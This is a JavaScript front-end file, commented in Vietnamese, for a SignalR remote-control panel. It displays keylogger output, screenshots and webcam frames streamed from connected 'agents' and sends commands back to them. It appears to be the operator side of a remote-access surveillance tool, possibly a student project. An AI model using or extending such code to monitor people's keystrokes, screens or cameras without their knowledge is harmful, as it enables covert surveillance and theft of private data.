// Js/app.js - Cập nhật phần kết nối
let connection;

function connectSignalR() {
    connection = new signalR.HubConnectionBuilder()
        .withUrl("/control")
        .withAutomaticReconnect()
        .build();

    // Nhận phản hồi từ Agent
    connection.on("ReceiveResponse", (data) => {
        handleServerMessage(data);
    });

    connection.on("ReceiveUpdate", (update) => {
        if (currentTab() === 'keylogger') {
            const log = document.getElementById('keylog-display');
            log.textContent += update;
            log.scrollTop = log.scrollHeight;
        }
    });

    connection.on("ReceiveBinaryStart", (type) => {
        currentBinaryType = type;
        binaryChunks = [];
    });

    connection.on("ReceiveBinary", (chunk) => {
        if (currentBinaryType) {
            binaryChunks.push(chunk);
        }
    });

    connection.on("ReceiveBinaryEnd", () => {
        if (currentBinaryType && binaryChunks.length > 0) {
            const blob = new Blob(binaryChunks, { type: 'image/jpeg' });
            const url = URL.createObjectURL(blob);

            if (currentBinaryType === 'screenshot') displayScreenshot(url);
            else if (currentBinaryType === 'webcam') displayWebcamFrame(url);

            binaryChunks = [];
            currentBinaryType = null;
        }
    });

    connection.on("Error", (msg) => {
        alert("Lỗi: " + msg);
    });

    connection.on("AgentList", (agents) => {
        console.log("Agents online:", agents);
        if (agents.length === 0) {
            showStatus("Không có máy nào online!", "danger");
        } else {
            showStatus(`Đã kết nối tới ${agents[0].name}`, "success");
        }
    });

    connection.start().then(() => {
        console.log("SignalR Connected");
    }).catch(err => {
        console.error("SignalR Error:", err);
        setTimeout(connectSignalR, 3000);
    });
}

// Gửi lệnh
function send(action, params = {}) {
    if (connection?.state === signalR.HubConnectionState.Connected) {
        connection.invoke("SendCommand", { action, ...params });
    }
}

// Khởi động
connectSignalR();